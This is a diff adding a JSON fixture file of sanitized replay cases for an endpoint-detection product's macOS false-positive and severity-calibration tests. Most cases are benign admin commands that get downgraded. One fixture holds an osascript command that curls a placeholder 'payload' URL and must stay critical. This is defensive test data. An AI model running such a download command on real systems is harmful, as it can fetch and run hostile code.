@@ -1,0 +1,110 @@
+{
+  "schema_version": 1,
+  "fixture_id": "macos-false-positive-replay-v1",
+  "description": "Sanitized replay fixtures for macOS false-positive and severity-calibration regressions.",
+  "claim_boundary": "Offline replay contract only. These fixtures validate expected severity policy shape; they do not prove endpoint collection or live detection coverage.",
+  "fixtures": [
+    {
+      "id": "osascript-tamandua-launchdaemon-admin",
+      "event_type": "process_create",
+      "input": {
+        "severity": "critical",
+        "title": "Agent detection: behavioral_high_risk_score",
+        "evidence": {
+          "detection": {
+            "rule_name": "behavioral_high_risk_score"
+          },
+          "process": {
+            "name": "osascript",
+            "path": "/usr/bin/osascript",
+            "parent_name": "Tamandua EDR",
+            "parent_path": "/Applications/Tamandua EDR.app/Contents/MacOS/tamandua-edr",
+            "command_line": "osascript -e 'do shell script \"launchctl kickstart -k system/com.tamandua.tamanduaagent\" with administrator privileges'"
+          }
+        },
+        "raw_event": {}
+      },
+      "expected": {
+        "alert_severity": "medium",
+        "severity_adjusted": true,
+        "fp_reason": "macos_behavioral_score_only_operational_tool_context"
+      }
+    },
+    {
+      "id": "launchctl-tamandua-bootstrap",
+      "event_type": "process_create",
+      "input": {
+        "severity": "high",
+        "title": "Agent detection: behavioral_high_risk_score",
+        "evidence": {
+          "detection": {
+            "rule_name": "behavioral_high_risk_score"
+          },
+          "process": {
+            "name": "launchctl",
+            "path": "/bin/launchctl",
+            "parent_name": "tamandua-agent",
+            "parent_path": "/opt/tamandua/tamandua-agent",
+            "command_line": "launchctl bootstrap system /Library/LaunchDaemons/com.tamandua.tamanduaagent.plist"
+          }
+        },
+        "raw_event": {}
+      },
+      "expected": {
+        "alert_severity": "medium",
+        "severity_adjusted": true,
+        "fp_reason": "macos_behavioral_score_only_operational_tool_context"
+      }
+    },
+    {
+      "id": "lsof-network-inventory-unusual-time",
+      "event_type": "process_create",
+      "input": {
+        "severity": "high",
+        "title": "Agent detection: behavioral_unusual_execution_time",
+        "evidence": {
+          "detection": {
+            "rule_name": "behavioral_unusual_execution_time"
+          },
+          "process": {
+            "name": "lsof",
+            "path": "/usr/sbin/lsof",
+            "parent_name": "tamandua-agent",
+            "command_line": "lsof -nP -iTCP -sTCP:ESTABLISHED"
+          }
+        },
+        "raw_event": {}
+      },
+      "expected": {
+        "alert_severity": "info",
+        "severity_adjusted": true,
+        "fp_reason": "macos_benign_unusual_execution_time_structured"
+      }
+    },
+    {
+      "id": "specific-applescript-remains-critical",
+      "event_type": "process_create",
+      "input": {
+        "severity": "critical",
+        "title": "Agent detection: behavioral_applescript_execution",
+        "evidence": {
+          "detection": {
+            "rule_name": "behavioral_applescript_execution"
+          },
+          "process": {
+            "name": "osascript",
+            "path": "/usr/bin/osascript",
+            "parent_name": "zsh",
+            "command_line": "osascript -e 'do shell script \"curl https://example.invalid/payload\"'"
+          }
+        },
+        "raw_event": {}
+      },
+      "expected": {
+        "alert_severity": "critical",
+        "severity_adjusted": false,
+        "fp_reason": null
+      }
+    }
+  ]
+}
